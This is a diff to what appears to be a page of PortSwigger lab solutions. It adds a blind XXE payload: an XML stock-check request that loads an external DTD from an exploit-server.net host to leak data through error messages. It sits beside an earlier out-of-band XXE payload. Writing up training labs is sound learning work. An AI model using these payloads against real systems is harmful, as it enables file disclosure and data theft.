@@ -414,7 +414,11 @@ location='https://exploit-0a6c004404690be78097022101e1007c.exploit-server.net/lo
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a63002903b89a6c8297743201af004b.exploit-server.net/malicious.dtd"> %xxe;]>
 <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+<!-- Exploiting blind XXE to retrieve data via error messages -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a44001203aa653186412e3e016d0074.exploit-server.net/error.dtd"> %xxe;]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
 ```
 {% endraw %}
-- malicious.dtd can be found [here](/assets/solutions/portswigger/malicious.dtd)
-
+- malicious.dtd can be found [here](/assets/solutions/portswigger/malicious.dtd).
+- error.dtd can be found [here](/assets/solutions/portswigger/error.dtd).
